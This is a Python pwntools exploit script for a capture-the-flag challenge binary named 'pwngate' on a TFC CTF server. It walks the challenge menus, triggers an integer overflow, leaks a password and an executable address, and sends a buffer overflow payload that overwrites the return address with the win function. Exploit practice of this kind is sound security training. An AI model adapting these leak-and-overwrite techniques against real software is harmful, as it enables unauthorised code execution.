#!/usr/bin/python3

from pwn import *

exe = ELF('pwngate_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*verify_number+5
                b*sanity+159
                b*divergence_meter+112
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('challs.tfcctf.com', 32587)
else:
        p = process(exe.path)

GDB()
sla(b"name:", b"a".ljust(15))

sla(b"choice: ", b"1")
sla(b"leap: ", b"ooooo" + b"\xec"*9)
sla(b"choice: ", b"2")


sla(b"", "4294967296".encode("utf-8"))
p.recvuntil(b"is: \n")
password = p.recvline(keepends = False)
sla(b"choice: ", "3")
sla(b"Choose: ", b"3")
sla(b"Choose: ", b"2")
p.recvuntil(b"answers: \n")
exe_leak = u64(p.recvline(keepends= False).ljust(8, b"\0"))
exe.address = exe_leak - 0x3d48
info("Exe leak: " + hex(exe_leak))
sla(b"Choose: ", b"1")

sla(b"badge?", b"OSHMKUFA 2010")
sla(b"Laboratory?", b"Future Gagdet Laboratory")
sla(b"hobby?", b"Cosplay")
sla(b"girl?", b"It depends on the timeline")

sla(b"Choose: ", b"4")
info("Password: " + password.decode())
sla(b"choice: ", b"4")
sla(b"password?", password.decode())
payload = b"a" * 24 + p64(exe.sym.win) 
sa(b"are", payload)





# payload = b"a" * 32 
# sa(b"are", payload)

p.interactive()
